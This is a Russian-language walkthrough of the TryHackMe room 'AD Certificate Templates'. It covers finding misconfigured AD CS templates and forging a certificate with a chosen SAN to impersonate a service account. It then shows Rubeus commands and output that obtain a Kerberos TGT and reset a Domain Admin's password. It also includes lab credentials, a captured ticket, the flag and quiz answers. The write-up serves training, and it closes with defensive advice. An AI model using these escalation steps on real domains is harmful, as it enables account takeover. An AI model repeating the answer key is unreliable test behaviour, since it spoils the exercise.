[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [AD Certificate Templates](https://tryhackme.com/r/room/adcertificatetemplates) 

Всего 7 заданий:
## Задание 1
В этом зале рассматривается служба сертификатов Active Directory ( AD CS) и неправильные настройки, обнаруженные в 
шаблонах сертификатов.
Исследование, проведенное и опубликованное в виде whitepaper компанией SpecterOps, показало, что можно использовать 
неправильно настроенные шаблоны сертификатов для повышения привилегий и горизонтального перемещения. Исходя из 
серьезности неправильной конфигурации, она могла позволить любому пользователю с низкими привилегиями в домене AD 
повысить свои привилегии до привилегий администратора домена предприятия всего за несколько щелчков!

В этой комнате представлено пошаговое руководство по перечислению неправильно настроенных шаблонов и созданию 
эксплойта повышения привилегий с их использованием. Комната в значительной степени основана на исследовании, 
проведенном SpecterOps, но охватывает только один путь эксплойта для сертификатов. Для получения дополнительной 
информации об эксплуатации AD CS, пожалуйста, прочтите их whitepaper.

Запустите виртуальную машину, чтобы начать комнату. Вы будете использовать RDP для подключения, поэтому обязательно 
используйте THM VPN или AttackBox, а затем RDP с клиентом RDP, например Remmina. Ниже приведены следующие учетные 
данные с низкими привилегиями. Пожалуйста, подождите около 5 минут, пока машина полностью загрузится.

Имя пользователя: thm
Пароль: Password1@

Домен: lunar.eruca.com

### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```

## Задание 2
Windows Active Directory ( AD ) не только предназначена для управления идентификацией и доступом, но и предоставляет 
значительное количество служб, помогающих вам управлять вашей организацией. Многие из этих служб менее известны или 
используются, что означает, что их часто упускают из виду при выполнении усиления безопасности. Одной из таких служб 
является служба сертификатов Active Directory (AD CS).

Когда мы говорим о сертификатах, мы обычно думаем только о самых распространенных, например, о тех, которые 
используются для обновления трафика веб-сайта до HTTPS. Но они обычно используются только для приложений, которые 
организация выставляет в Интернет. А как насчет всех тех приложений, работающих во внутренней сети? Должны ли мы 
теперь предоставлять им доступ в Интернет, чтобы они могли запросить сертификат у доверенного центра сертификации 
(CA)? Ну, не совсем. Давайте AD CS.

**AD CS** — это реализация инфраструктуры открытых ключей (PKI) Microsoft. Поскольку AD обеспечивает уровень доверия в 
организации, ее можно использовать в качестве CA для подтверждения и делегирования доверия. AD CS используется для 
нескольких целей, таких как шифрование файловых систем, создание и проверка цифровых подписей и даже аутентификация 
пользователей, что делает ее перспективным направлением для злоумышленников. Что делает ее еще более опасным 
вектором атаки, так это то, что сертификаты могут выдерживать ротацию учетных данных, то есть даже если пароль 
скомпрометированной учетной записи будет сброшен, это не сделает недействительным вредоносный сертификат, 
обеспечивая постоянную кражу учетных данных в течение 10 лет! На схеме ниже показано, как выглядит поток запросов и 
генерации сертификатов (взято из документа SpecterOps):

Поскольку AD CS является такой привилегированной функцией, она обычно работает на выбранных контроллерах домена. Это 
означает, что обычные пользователи не могут напрямую взаимодействовать со службой. С другой стороны, организации, 
как правило, слишком велики, чтобы администратор мог вручную создавать и распространять каждый сертификат. Вот 
тут-то и появляются шаблоны сертификатов. Администраторы AD CS могут создать несколько шаблонов, которые позволят 
любому пользователю с соответствующими разрешениями самостоятельно запрашивать сертификат. Эти шаблоны имеют 
параметры, которые говорят, какой пользователь может запрашивать сертификат и что для этого требуется. SpecterOps 
обнаружил, что определенные комбинации этих параметров могут быть невероятно токсичными и использоваться для 
повышения привилегий и постоянного доступа!

Прежде чем мы углубимся в тему злоупотреблений сертификатами, немного терминологии:

- PKI (Public Key Infrastructure) — это система, которая управляет сертификатами и шифрованием открытых ключей.
- AD CS (Active Directory Certificate Services) — это реализация PKI от Microsoft , которая обычно работает на 
  контроллерах домена.
- CA (Центр сертификации) — это PKI , который выдает сертификаты.
- Шаблон сертификата — набор настроек и политик, определяющих, как и когда сертификат может быть выдан центром 
  сертификации.
- CSR (Certificate Signing Request) — это сообщение, отправляемое в центр сертификации для запроса подписанного 
  сертификата.
- EKU (Extended/Enhanced Key Usage) — это идентификаторы объектов, которые определяют, как может использоваться 
  сгенерированный сертификат.
### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```
Что создает пользователь, чтобы запросить у центра сертификации сертификат?
```commandline
Certificate Signing Request
```
Как называется реализация PKI от Microsoft?
```commandline
Active Directory Certificate Services
```

## Задание 3
Первым шагом на этом пути является перечисление всех шаблонов сертификатов, чтобы выявить уязвимые и понять, что 
требуется для их эксплуатации.

К счастью, в Windows есть несколько замечательных встроенных инструментов, которые можно использовать для 
перечисления всех шаблонов сертификатов и связанных с ними политик. Наиболее распространенный подход — использовать 
certutil. Если у нас есть доступ к компьютеру, присоединенному к домену, и мы аутентифицированы в домене, мы можем 
выполнить следующую команду в окне cmd, чтобы перечислить все шаблоны и сохранить их в файле:

`
certutil -v -template > cert_templates.txt
`
Вы должны получить в текстовом файле следующий вывод:

Команда предоставит кучу выходных данных, которые может быть трудно читать, но мы ищем некоторые ключевые индикаторы,
которые скажут нам, что один из шаблонов уязвим. В выходных данных каждый шаблон обозначается как , Template[X]где X 
— это номер. Это можно использовать, если вы хотите разделить выходные данные из одного шаблона.

Конкретный набор токсичных параметров, который мы ищем, имеет следующие характеристики:

- Шаблон, в котором у нас есть соответствующие разрешения на запрос сертификата или в котором у нас есть учетная 
запись с такими разрешениями
- Шаблон, который позволяет аутентифицировать клиента, то есть мы можем использовать его для аутентификации Kerberos .
- Шаблон, позволяющий нам изменять альтернативное имя субъекта (SAN)
Параметр 1: Соответствующие разрешения

Нам нужны разрешения на создание запроса на сертификат, чтобы этот эксплойт сработал. По сути, мы ищем шаблон, в 
котором у нашего пользователя есть разрешение Allow Enroll или Allow Full Control . Вы, вероятно, никогда не найдете 
сертификат, в котором у вас есть разрешение Allow Full Control . Однако если вы его найдете, поздравляем! Вы можете 
сами неправильно настроить шаблон, чтобы сделать его уязвимым! Но сейчас давайте сосредоточимся на Allow Enroll.

Это не так просто, как просто выполнить grep по выходным данным для ключевых слов Allow Enroll и вашей учетной 
записи AD , поскольку разрешения шаблонов сертификатов в большинстве случаев назначаются группам AD , а не напрямую 
пользователям AD . Поэтому вам придется выполнить grep по всем ключевым словам Allow Enroll и просмотреть выходные 
данные, чтобы увидеть, соответствуют ли какие-либо из возвращенных групп группам, к которым принадлежит ваш 
пользователь. Если вам нужно найти свои собственные группы, вы можете использовать эту команду:

`net user <username> /domain
`
Существуют две группы, которые будут довольно распространены для сертификатов:

- Пользователи домена. В большинстве случаев это означает, что любой аутентифицированный пользователь может запросить 
сертификат.
- Domain Computers - Это означает, что учетная запись машины хоста, присоединенного к домену, может запросить 
  сертификат. Если у нас есть права администратора на любой машине, мы можем запросить сертификат от имени учетной записи машины
Однако обычно разумно просмотреть все разрешения сертификатов, так как это может указать вам на учетную запись, которую вы можете скомпрометировать.

#### Параметр 2: Аутентификация клиента

После того, как мы сократили список до шаблонов сертификатов, которые нам разрешено запрашивать, следующим шагом 
будет обеспечение наличия у сертификата Client Authentication EKU. Этот EKU означает, что сертификат может 
использоваться для аутентификации Kerberos . Существуют и другие способы использования сертификатов, но в этой 
комнате этот EKU будет в центре внимания.

Поэтому на данный момент нас интересуют только сертификаты, которые допускают аутентификацию клиента, то есть 
сертификат будет выдан при условии, что мы являемся аутентифицированным пользователем на машине, запрашивающей 
сертификат.
Чтобы найти их, нам нужно просмотреть свойства EKU шаблона и убедиться, что слова Client Authentication указаны. 
Другие шаблоны, которые не соответствуют этому, на данный момент мы можем отбросить.

#### Параметр 3: Клиент указывает SAN

И последнее, но не менее важное: нам нужно проверить, позволяет ли шаблон нам, клиенту сертификата, указать 
альтернативное имя субъекта (SAN). SAN обычно представляет собой что-то вроде URL-адреса веб-сайта, который мы хотим 
зашифровать. Например: tryhackme.com. Однако, если у нас есть возможность контролировать SAN, мы можем использовать 
сертификат для фактической генерации билета Kerberos для любой учетной записи AD по нашему выбору!

Чтобы найти эти шаблоны, мы ищем флаг свойства CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT , который должен быть установлен на 
1. Это означает, что мы можем самостоятельно указать SAN.

Если мы найдем шаблон, в котором выполнены все три условия, то мы в деле и всего в нескольких кликах от полных прав 
администратора предприятия! Следует отметить, что есть и другие условия, например, тот факт, что нам нужен 
сертификат, который не проходит процесс утверждения, чтобы ограничить вмешательство человека, но полный список этих 
параметров здесь не рассматривается просто потому, что по умолчанию первоначальная генерация шаблона сертификации 
делает шаблон уязвимым. Эти дополнительные ограничения шаблонов и EKU подробно обсуждаются в whitepaper.

### Ответьте на вопросы ниже
Какая группа AD разрешит всем учетным записям пользователей AD запрашивать сертификат?
```commandline
Domain Users
```
Какая группа AD разрешит всем компьютерам, подключенным к домену, запрашивать сертификат?
```commandline
Domain Computers
```
Какой EKU позволяет нам использовать сгенерированный сертификат для аутентификации Kerberos?
```commandline
Client Authentication
```
Какой шаблон сертификата неправильно настроен на основе трех предоставленных параметров?
```commandline
User Request
```

## Задание 4
Теперь, когда мы определили шаблон сертификата, который мы можем использовать, пришло время сгенерировать запрос 
сертификата. Вы можете сделать этот шаг из командной строки, если хотите, но зачем усложнять себе жизнь, когда 
Microsoft просто позволяет вам делать взлом нажатием нескольких кнопок!

Для запроса нового сертификата мы будем использовать Microsoft Management Console. Загрузите консоль, введя mmc в 
окне запуска:

Это вызовет окно MMC. В этом окне нажмите Файл -> Добавить/удалить оснастку...
В этом окне необходимо добавить оснастку «Сертификаты» :
Хотя при наличии прав администратора оснастка будет добавлена напрямую, вы увидите следующий запрос:

Этот запрос позволяет вам выдавать себя за учетные записи служб или учетную запись машины. Но вы можете выполнить 
эти действия только при наличии прав администратора на хосте, которых у нас в настоящее время нет. Теперь вы можете 
закрыть менеджер оснастки и вернуться на главный экран консоли. Разверните параметр Сертификаты , щелкните правой 
кнопкой мыши Личные , выберите Все задачи и щелкните Запросить новый сертификат : 



Для первого варианта просто дважды нажмите «Далее» , поскольку мы используем ЦС по умолчанию, вы должны увидеть 
следующий экран с доступными шаблонами: 


Как вы видите на экране, нам нужно заполнить информацию для нашего сертификата, прежде чем мы сможем 
зарегистрировать его. Нажмите ссылку «Требуется дополнительная информация для регистрации этого сертификата», чтобы 
начать процесс. 


На этом экране нам нужно быть очень конкретными в отношении информации, которую мы предоставляем. Чтобы 
гарантировать, что сертификат может быть использован для билета Kerberos привилегированного пользователя, нам 
требуется User Principal Name пользователя, которого мы хотим выдать. Его можно найти с помощью инструментов AD 
-RSAT или чего-то вроде скриптов PowerView.

В этом примере мы выдадим себя за одного из пользователей DA в этом домене. Давайте нацелимся на учетную запись svc.
gitlab , поскольку это учетная запись службы, то есть от этой учетной записи, скорее всего, ожидается аутентификация 
Kerberos . UPN этой учетной записи — svc.gitlab@lunar.eruca.com . Используя эту информацию, мы можем заполнить 
свойства сертификата.   

Сначала мы меняем Тип имени субъекта на Общее имя и указываем имя, которое мы хотим для этого сертификата. Затем мы 
меняем Тип альтернативного имени на Имя участника-пользователя и указываем UPN учетной записи, которую мы хотим 
олицетворять. Значения должны выглядеть следующим образом: 



Затем мы можем добавить эти свойства в наш сертификат:



Нажав «ОК», мы увидим, что нам разрешено зарегистрировать этот сертификат:



Завершите регистрацию сертификата. После регистрации вы сможете просмотреть сертификат в разделе ваших персональных сертификатов:



Если мы просмотрим данные сертификата, то увидим, что SAN теперь указывает UPN, который мы хотим выдать, а не SAN нашего веб-сервера!



Поздравляем, вы только что сгенерировали сертификат, который обеспечит вам постоянную аутентификацию в домене в течение следующих двух лет! Последний шаг — фактически экспортировать сертификат, чтобы подготовить его к использованию. Щелкните правой кнопкой мыши по сертификату, выберите All Tasks, а затем Export :



Следуйте инструкциям, но не забудьте также экспортировать закрытый ключ:



Сертификат должен быть в формате pfx. Кроме того, настройте пароль для сертификата, чтобы гарантировать экспорт закрытого ключа:



Выберите имя файла и экспортируйте сертификат:



Теперь ваш сертификат готов к эксплуатации!

#### Ответьте на вопросы ниже
В какое поле мы вводим основное имя пользователя учетной записи, которую мы хотим выдать?
```commandline
Subject Alternative Name
```
Если бы у нас был административный доступ, то при добавлении оснастки какой вариант мы бы выбрали, чтобы использовать учетную запись компьютера хоста вместо нашей аутентифицированной учетной записи AD для генерации сертификата?
```commandline
Computer account
```
Следуйте инструкциям выше и создайте свой собственный сертификат повышения привилегий.
```commandline
Ответ не нужен
```

## Задание 5
Теперь мы наконец можем выдать себя за пользователя. Для этого необходимо выполнить два шага:

Используйте сертификат для запроса билета на выдачу билета Kerberos ( TGT )
Загрузите Kerberos TGT в выбранную вами хакерскую платформу
Для первого шага мы будем использовать Rubeus . Уже скомпилированная версия доступна в C:\THMTools\каталоге. Откройте окно командной строки и перейдите в этот каталог. Мы будем использовать следующую команду для запроса TGT :

Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:lunar.eruca.com /dc:<IP of domain controller>

Давайте разберем параметры:

/user — указывает пользователя, от имени которого мы будем действовать, и он должен соответствовать UPN для сгенерированного нами сертификата.
/enctype - Это указывает тип шифрования для билета. Настройка этого важна для обхода, так как алгоритм шифрования по умолчанию слаб, что приведет к предупреждению overpass-the-hash
/certificate - Путь к сгенерированному нами сертификату
/password - Пароль для нашего файла сертификата.
/outfile - Файл, в который будет выведен наш TGT
/domain — полное доменное имя домена, который мы в данный момент атакуем.
/dc - IP контроллера домена, с которого мы запрашиваем TGT . Обычно лучше всего выбрать DC , на котором запущена служба CA
После выполнения команды мы должны получить наш TGT :

ТГТ
Запрос
```commandline
C:\THMTools> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5
             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf
             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw
             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G
             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/lunar.eruca.com
         ServiceRealm             :  LUNAR.ERUCA.COM
         UserName                 :  svc.gitlab
         UserRealm                :  LUNAR.ERUCA.COM
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```
Теперь нам нужно использовать этот TGT для получения доступа. Это можно сделать с помощью вашего любимого хакерского фреймворка, например metasploit, cobaltstrike или Covenant. Однако для целей этого пошагового руководства мы снова воспользуемся Rubeus. Мы воспользуемся билетом для изменения пароля одного из администраторов домена. Это позволит нам использовать учетные данные DA для входа в контроллер домена в качестве администратора для восстановления последнего флага. Откройте приложение Active Directory Users and Computers и изучите структуру домена, найдя DA:



Выберите одного из DA и используйте следующую команду, чтобы изменить его пароль:

Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<username of targeted DA>

После выполнения команды должен измениться пароль для связанной учетной записи DA:

Сброс пароля пользователя
```commandline
C:\THMTools> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
           ______        _
          (_____ \      | |
           _____) )_   _| |__  _____ _   _  ___
          |  __  /| | | |  _ \| ___ | | | |/___)
          | |  \ \| |_| | |_) ) ____| |_| |___ |
          |_|   |_|____/|____/|_____)____/(___/
        
          v2.0.0
        
        [*] Action: Reset User Password (AoratoPw)
        
        [*] Using domain controller: LUNDC.lunar.eruca.com (10.10.69.219)
        [*] Resetting password for target user: lunar.eruca.com\da-nread
        [*] New password value: Tryhackme!
        [*] Building AP-REQ for the MS Kpassword request
        [*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
        [*] base64(session subkey): UP+L2OgmJ281TkkXYNKR0ahLJni1fIk/XMBFwwNTP7Q=
        [*] Building the KRV-PRIV structure
        [+] Password change success!
```
Теперь вы можете аутентифицироваться как этот пользователь на контроллере домена и восстановить последний флаг. Отлично! Теперь вы скомпрометировали DA! В качестве дополнительного бонуса давайте рассмотрим команду runas, которую мы можем использовать для аутентификации как другого пользователя в командной строке. Мы можем использовать следующую команду в cmd для аутентификации как теперь скомпрометированный пользователь DA:

runas /user:lunar.eruca.com\<username of DA> cmd.exe

Вам будет предложено ввести пароль для связанной учетной записи. Если он правильный,  runasоткроется окно командной строки для вас как указанного пользователя, которое вы теперь можете использовать для административных задач.
### Ответьте на вопросы ниже
Какое значение флага хранится на рабочем столе администратора?
```commandline
THM{AD.Certs.Can.Get.You.DA}
```

## Задание 6
Так как же на самом деле можно защититься от атак с использованием шаблонов сертификатов?

На самом деле, простого ответа нет, но есть несколько хороших методов защиты:

- Проверьте все шаблоны сертификатов в вашей организации на наличие ядовитых комбинаций параметров. Вы можете 
использовать PSPKIAudit, чтобы помочь в этом.
- В случаях, когда невозможно избежать опасных комбинаций параметров, убедитесь, что предусмотрены временные меры, 
  например, требование одобрения администратора перед выдачей сертификата.
- Обновите свои сценарии. В большинстве организаций сценарии будут включать что-то вроде сброса учетных данных для 
  скомпрометированной учетной записи. Как здесь указано, это на самом деле не исправит постоянный доступ. Поэтому 
  потребуется просмотреть выданные сертификаты, а вредоносный сертификат придется отозвать.

### Ответьте на вопросы ниже
Прочитайте выше

```commandline
Ответ не нужен
```

## Задание 7
Вот и всё!

В этой лабораторной работе мы продемонстрировали возможный метод эксплуатации неправильно настроенных шаблонов сертификатов AD . Как упоминалось ранее, существует несколько различных потенциально токсичных комбинаций параметров, которые вы можете использовать. Прочитайте технический документ SpecterOps, если вам интересно узнать больше. Поскольку в лабораторной работе есть полноценный контроллер домена, и теперь у вас есть доступ к DA, вы можете настроить собственные шаблоны сертификатов, чтобы поиграться с ними. Развлекайтесь!

### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)